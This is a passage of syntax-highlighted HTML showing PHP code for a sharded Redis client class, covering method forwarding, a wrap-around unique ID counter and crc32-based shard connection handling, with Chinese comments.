</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#36716;&#21457;&#26041;&#27861;&#35843;&#29992;&#21040;&#30495;&#27491;&#30340;redis&#23545;&#35937;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">__call</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">arguments</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">result</span> = call_user_func_array(<span style=\"color: #99cc99;\">array</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">redis</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">arguments</span>[0]), <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>)<span style=\"text-decoration: underline;\">, </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">arguments</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">result</span> === <span style=\"color: #6699cc;\">false</span> <span style=\"color: #99cc99;\">and</span> in_array(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>, <span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'set'</span>, <span style=\"color: #66cccc;\">'setex'</span>, <span style=\"color: #66cccc;\">'incr'</span>)))<span style=\"text-decoration: underline;\"> {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   trigger_error(<span style=\"color: #66cccc;\">\"redis error: \"</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[0] . <span style=\"color: #66cccc;\">':'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span><span style=\"text-decoration: underline;\">[1] . </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> .</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #6699cc; text-decoration: underline;\">this</span><span style=\"text-decoration: underline;\">-&gt;</span><span style=\"color: #ffcc66; text-decoration: underline;\">shard</span><span style=\"text-decoration: underline;\">[2] . </span><span style=\"color: #66cccc; text-decoration: underline;\">\" </span><span style=\"color: #ffcc66; text-decoration: underline;\">$name</span><span style=\"color: #66cccc; text-decoration: underline;\"> \"</span><span style=\"text-decoration: underline;\"> . implode(</span><span style=\"color: #66cccc; text-decoration: underline;\">' '</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">arguments</span><span style=\"text-decoration: underline;\">), </span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_NOTICE</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">result</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;1&#33267;max&#38388;&#30340;&#21807;&#19968;&#24207;&#21495;name&#65292;&#36798;&#21040;max&#21518;&#20250;&#20174;1&#24320;&#22987;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">redis&#30340;&#36882;&#22686;&#21040;&#26368;&#22823;&#20540;&#21518;&#20250;&#36820;&#22238;&#38169;&#35823;&#65292;&#26412;&#26041;&#27861;&#23454;&#29616;&#23433;&#20840;&#30340;&#36882;&#22686;&#12290;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#22833;&#36133;&#36820;&#22238;false&#65292;&#26368;&#35201;&#30830;&#20445;&#24050;&#29992;redis()&#26041;&#27861;&#36830;&#21040;&#29983;&#25104;&#24207;&#21495;&#30340;&#26576;&#20010;redis&#23545;&#35937;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">id</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #99cc99;\">isset</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">incr</span>(<span style=\"color: #66cccc;\">'_id_'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span> = intval(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>/count(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> % <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span> == 0){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">while</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">decrBy</span>(<span style=\"color: #66cccc;\">'_id_'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">name</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>) &gt;=<span style=\"text-decoration: underline;\"> </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">max</span><span style=\"text-decoration: underline;\">){</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">else</span> <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> &gt; <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> %= <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">max</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">id</span> - 1)*count(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>) + (<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'index'</span>] +<span style=\"text-decoration: underline;\"> 1);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">&#36830;&#25509;&#24182;&#36820;&#22238;key&#23545;&#24212;&#30340;redis&#23545;&#35937;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">public</span> <span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">redis</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">key</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">TODO: crc32&#22312;32&#20301;&#31995;&#32479;&#19979;&#20250;&#36820;&#22238;&#36127;&#25968;&#65292;&#22240;&#25105;&#20204;&#26159;&#37096;&#32626;&#22312;64&#20301;&#31995;&#32479;&#19978;&#65292;&#26242;&#26102;&#24573;&#30053;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(<span style=\"color: #6699cc;\">PHP_INT_SIZE</span> === 8);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span> = crc32(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">key</span>) % count(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shards</span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">index</span>];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #99cc99;\">isset</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">&#23581;&#35797;&#37325;&#29992;&#24050;&#26377;&#36830;&#25509;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[0] == <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0] <span style=\"color: #99cc99;\">and</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[1] == <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[1]){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[2] != <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[2]){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">select</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[2])){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   trigger_error(<span style=\"color: #66cccc;\">'redis error: select '</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0] . <span style=\"color: #66cccc;\">':'</span> .<span style=\"text-decoration: underline;\"> </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">shard</span><span style=\"text-decoration: underline;\">[1] . </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> .</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">shard</span><span style=\"text-decoration: underline;\">[2], </span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[2] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[2];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close</span>();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">unset</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">&#26032;&#24314;&#36830;&#25509;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>] = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">connect</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0], <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[1])){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   trigger_error(<span style=\"color: #66cccc;\">'redis error: connect '</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0] . <span style=\"color: #66cccc;\">':'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[1],<span style=\"text-decoration: underline;\"> </span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">db</span> = intval(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[2]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">db</span> != 0 <span style=\"color: #99cc99;\">and</span> <span style=\"color: #6699cc;\">!</span><span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">select</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">db</span>)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   trigger_error(<span style=\"color: #66cccc;\">'redis error: select '</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0] . <span style=\"color: #66cccc;\">':'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[1] .<span style=\"text-decoration: underline;\"> </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> .</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">shard</span><span style=\"text-decoration: underline;\">[2], </span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_ERROR</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>]-&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">close</span>();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">ENABLE_DEVELOP</span>){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   trigger_error(<span style=\"color: #66cccc;\">'redis connect success. '</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[0] . <span style=\"color: #66cccc;\">':'</span> . <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>[1<span style=\"text-decoration: underline;\">] . </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> . </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">shard</span><span style=\"text-decoration: underline;\">[2], </span><span style=\"color: #6699cc; text-decoration: underline;\">E_USER_NOTICE</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; 